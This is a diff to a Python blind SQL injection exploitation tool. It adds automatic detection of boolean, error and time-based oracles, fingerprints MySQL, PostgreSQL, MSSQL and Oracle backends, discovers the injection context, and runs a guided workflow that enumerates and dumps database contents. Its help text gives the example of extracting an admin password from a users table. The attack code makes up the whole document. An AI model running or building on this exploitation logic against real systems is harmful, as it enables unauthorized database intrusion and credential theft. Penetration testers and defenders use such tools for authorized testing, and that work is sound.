@@ -476,33 +476,89 @@ def extract_scalar(args, label=""):
 # --------------------------------------------------------------------------- #
 # Auto detection + interactive enumeration
 # --------------------------------------------------------------------------- #
-def resolve_mode(args):
-    """--mode auto: probe for a boolean/content oracle first (engine-independent,
-    across candidate escapes). If TRUE vs FALSE responses differ, use boolean and
-    lock in the escape + oracle. Otherwise fall back to time (universal)."""
-    print("[*] Auto-selecting oracle mode...")
+def _probe_oracle(args):
+    """Send TRUE (1=1) and FALSE (1=2) with the current mode/dbms/esc and try to
+    build a discriminating oracle. Returns (oracle, desc) or None."""
+    try:
+        r_t, e_t = _send_retry(args, wrap(args, "1=1"))
+        r_f, e_f = _send_retry(args, wrap(args, "1=2"))
+        oracle, desc = derive_oracle(args, r_t, e_t, r_f, e_f)
+        if oracle(r_t, e_t) and not oracle(r_f, e_f):
+            return oracle, desc
+    except (SystemExit, requests.RequestException):
+        pass
+    return None
+
+
+def resolve_auto(args):
+    """--mode auto: fully resolve mode + DBMS + context + oracle by probing the
+    target. Tries boolean (content) -> error (per engine) -> time. On success
+    everything needed for extraction is set and args._resolved is True."""
+    print("[*] Auto-detecting: mode + context + DBMS ...")
     escapes = CONTEXTS if args.context == "auto" else [("set", args.esc)]
+    saved_dbms = args.dbms
+
+    # 1. Boolean / content oracle (engine-independent break-out).
     args.mode = "boolean"
     for name, esc in escapes:
         args.esc = esc
-        try:
-            r_t, e_t = _send_retry(args, wrap(args, "1=1"))
-            r_f, e_f = _send_retry(args, wrap(args, "1=2"))
-            oracle, desc = derive_oracle(args, r_t, e_t, r_f, e_f)
-            ok = oracle(r_t, e_t) and not oracle(r_f, e_f)
-        except (SystemExit, requests.RequestException):
-            ok = False
-        print(f"      boolean (esc={esc!r}) -> {'yes' if ok else 'no'}")
-        if ok:
-            args._oracle = oracle
-            print(f"[+] Mode: boolean   Context: {name} (esc={esc!r})   "
-                  f"Oracle: {desc}\n")
+        res = _probe_oracle(args)
+        print(f"      boolean (esc={esc!r}) -> {'yes' if res else 'no'}")
+        if res:
+            args._oracle, desc = res
+            # Boolean is engine-independent, so fingerprint the DBMS now
+            # (needed for correct enumeration queries).
+            engine = detect_dbms(args)
+            args.dbms = engine or saved_dbms
+            args._resolved = True
+            print(f"[+] Mode: boolean   DBMS: {args.dbms}"
+                  f"{'' if engine else ' (fingerprint failed, assumed)'}   "
+                  f"Context: {name} (esc={esc!r})   Oracle: {desc}\n")
             return
-    # No content/error difference -> time is the only reliable channel.
+
+    # 2. Error-based oracle: TRUE triggers a DB error. Engine-specific, so this
+    #    identifies the backend and the context in one shot.
+    args.mode = "error"
+    for engine in ("oracle", "postgres", "mssql", "mysql"):
+        args.dbms = engine
+        for name, esc in escapes:
+            args.esc = esc
+            res = _probe_oracle(args)
+            if res:
+                args._oracle, desc = res
+                args._resolved = True
+                print(f"      error ({engine}, esc={esc!r}) -> yes")
+                print(f"[+] Mode: error   DBMS: {engine}   "
+                      f"Context: {name} (esc={esc!r})   Oracle: {desc}\n")
+                return
+    print("      error -> no match on any engine")
+
+    # 3. Time: fingerprint engine + context together via a confirmed delay.
+    args.dbms = saved_dbms
     args.mode = "time"
-    args.esc = None if args.context == "auto" else escapes[0][1]
-    print("[+] Mode: time (responses don't differ on TRUE/FALSE — "
-          "using SLEEP timing)\n")
+    print("[*] Trying time-based detection...")
+    for name, esc in escapes:
+        for engine, tmpl in TIME_FINGERPRINT.items():
+            payload = tmpl.format(d=int(round(args.delay)), esc=esc)
+            if timed_hit(args, payload):
+                args.dbms = engine
+                args.esc = esc
+                thresh = args.delay * 0.8
+                args._oracle = (lambda r, e: e >= thresh)
+                args._resolved = True
+                if args.threads > 1:
+                    print(f"      (forcing --threads 1 for reliable time mode)")
+                    args.threads = 1
+                print(f"[+] Mode: time   DBMS: {engine}   "
+                      f"Context: {name} (esc={esc!r})   Oracle: time >= "
+                      f"{thresh:.1f}s\n")
+                return
+
+    raise SystemExit(
+        "[!] Auto-detection found no working oracle (boolean / error / time).\n"
+        "    The parameter may not be injectable, or needs a custom escape.\n"
+        "    Try: a larger --delay, or set --mode/--dbms/--context/--prefix "
+        "manually.")
 
 
 def detect_context(args):
@@ -527,19 +583,32 @@ def detect_context(args):
     return None
 
 
+def timed_hit(args, payload):
+    """True only if the payload reliably delays: the first response must exceed
+    the threshold AND a re-check must too (rejects one-off slow responses that
+    would otherwise cause a false fingerprint match)."""
+    thresh = args.delay * 0.8
+    try:
+        _, e = _send_retry(args, payload)
+        if e < thresh:
+            return False
+        for _ in range(max(1, getattr(args, "confirm", 1))):
+            _, e2 = _send_retry(args, payload)
+            if e2 < thresh:
+                return False   # didn't delay on re-check -> false positive
+    except requests.RequestException:
+        return False
+    return True
+
+
 def detect_context_time(args):
     """Time-mode context detection for a KNOWN engine (non-interactive path):
     try each escape with args.dbms's unconditional sleep; keep the one that
     delays. Sets args.esc. Returns the escape, or None."""
-    thresh = args.delay * 0.8
     for name, esc in CONTEXTS:
         payload = TIME_FINGERPRINT[args.dbms].format(
             d=int(round(args.delay)), esc=esc)
-        try:
-            _, e = _send_retry(args, payload)
-            ok = e >= thresh
-        except requests.RequestException:
-            ok = False
+        ok = timed_hit(args, payload)
         print(f"      {name:<12} (esc={esc!r}) -> {'MATCH (delayed)' if ok else 'no'}")
         if ok:
             args.esc = esc
@@ -569,8 +638,8 @@ def detect_dbms(args):
         return None
 
     # time / error -> timing fingerprint. If context is unknown (esc is None),
-    # try each escape here too, so context + engine are found together.
-    thresh = args.delay * 0.8
+    # try each escape here too, so context + engine are found together. Each hit
+    # is confirmed (timed_hit) to reject one-off slow responses.
     if getattr(args, "esc", "'") is None:
         esc_candidates = CONTEXTS
     else:
@@ -578,11 +647,7 @@ def detect_dbms(args):
     for _cname, esc in esc_candidates:
         for engine, tmpl in TIME_FINGERPRINT.items():
             payload = tmpl.format(d=int(round(args.delay)), esc=esc)
-            try:
-                _, elapsed = _send_retry(args, payload)
-                hit = elapsed >= thresh
-            except requests.RequestException:
-                hit = False
+            hit = timed_hit(args, payload)
             tag = f"{engine} (esc={esc!r})"
             print(f"      {tag:<24} -> {'MATCH (delayed)' if hit else 'no'}")
             if hit:
@@ -613,24 +678,25 @@ def ask(prompt, default=None):
 
 def run_auto(args):
     """Interactive, guided detect -> enumerate -> dump workflow."""
-    # Boolean mode: build the content oracle first (marker or auto-derived),
-    # then fingerprint using it. Time/error: fingerprint by timing first (needs
-    # no oracle), then calibrate the extraction oracle once dbms is known.
-    if args.mode == "boolean":
-        calibrate(args)
-        engine = detect_dbms(args)
+    # If --mode auto already resolved everything, reuse it and skip re-detection.
+    if getattr(args, "_resolved", False):
+        engine = args.dbms
+        print(f"[*] Resolved: mode={args.mode}, dbms={engine}, "
+              f"context esc={args.esc!r}\n")
     else:
+        # Explicit --mode with --auto. Boolean: build content oracle then
+        # fingerprint. Time/error: fingerprint by timing, then calibrate.
+        if args.mode == "boolean":
+            calibrate(args)
         engine = detect_dbms(args)
-
-    if not engine:
-        raise SystemExit("[!] Could not fingerprint the DBMS. It may be a less "
-                         "common engine, or the injection context needs a custom "
-                         "--prefix/--suffix. Try setting --dbms manually.")
-    args.dbms = engine
-    print(f"\n[+] DBMS detected: {engine}\n")
-
-    if args.mode != "boolean":
-        calibrate(args)  # now that dbms is known, set up the extraction oracle
+        if not engine:
+            raise SystemExit("[!] Could not fingerprint the DBMS. It may be a "
+                             "less common engine, or the context needs a custom "
+                             "--prefix/--suffix. Try setting --dbms manually.")
+        args.dbms = engine
+        print(f"\n[+] DBMS detected: {engine}\n")
+        if args.mode != "boolean":
+            calibrate(args)
 
     # 3. Version + current DB (nice-to-have context)
     ver = extract_query(args, VERSION_QUERY[engine], label="version: ")
@@ -730,11 +796,12 @@ def main():
                    help="Sub-query to extract, e.g. "
                         "\"SELECT password FROM users WHERE username='admin'\" "
                         "(not needed with --auto)")
-    p.add_argument("--mode", default="boolean",
+    p.add_argument("--mode", default=None,
                    choices=["boolean", "time", "error", "auto"],
                    help="Oracle type: boolean (content differs), time (SLEEP), "
                         "error (TRUE triggers a SQL error), or auto (try "
-                        "boolean, fall back to time)")
+                        "boolean -> error -> time). Default: auto with --auto, "
+                        "else boolean")
     p.add_argument("--dbms", default="mysql",
                    choices=["mysql", "postgres", "mssql", "oracle"],
                    help="Backend DB — picks SLEEP/SUBSTRING/comment syntax")
@@ -744,10 +811,11 @@ def main():
                         "status code or response length")
     p.add_argument("--delay", type=float, default=3.0,
                    help="Seconds a TRUE condition should sleep (time mode)")
-    p.add_argument("--context", default="string",
+    p.add_argument("--context", default=None,
                    choices=["string", "numeric", "double", "auto"],
                    help="Injection context / literal escape: string ('), "
-                        "numeric (none), double (\"), or auto to detect it")
+                        "numeric (none), double (\"), or auto to detect it. "
+                        "Default: auto with --auto, else string")
     p.add_argument("--confirm", type=int, default=1,
                    help="Time mode only: re-check a positive result N times to "
                         "reject network-jitter false positives (default 1)")
@@ -808,7 +876,14 @@ def main():
     args._base_headers = {"User-Agent": "authorized-pentest/1.0"}
     args._base_headers.update(parse_headers(args.header))
 
+    # --auto means "figure everything out": default mode and context to auto.
+    if args.mode is None:
+        args.mode = "auto" if args.auto else "boolean"
+    if args.context is None:
+        args.context = "auto" if args.auto else "string"
+
     args._oracle = None
+    args._resolved = False
     _ESC_MAP = {"string": "'", "numeric": "", "double": '"'}
     args.esc = None if args.context == "auto" else _ESC_MAP[args.context]
 
@@ -835,9 +910,9 @@ def main():
         print(f"[*] Query  : {args.query}")
     print()
 
-    # Auto-select the oracle mode first (may set mode, esc, and oracle).
+    # Auto-resolve mode + context + dbms + oracle first (may set all of them).
     if args.mode == "auto":
-        resolve_mode(args)
+        resolve_auto(args)
 
     # Resolve injection context when still needed.
     if args.context == "auto" and args._oracle is None:
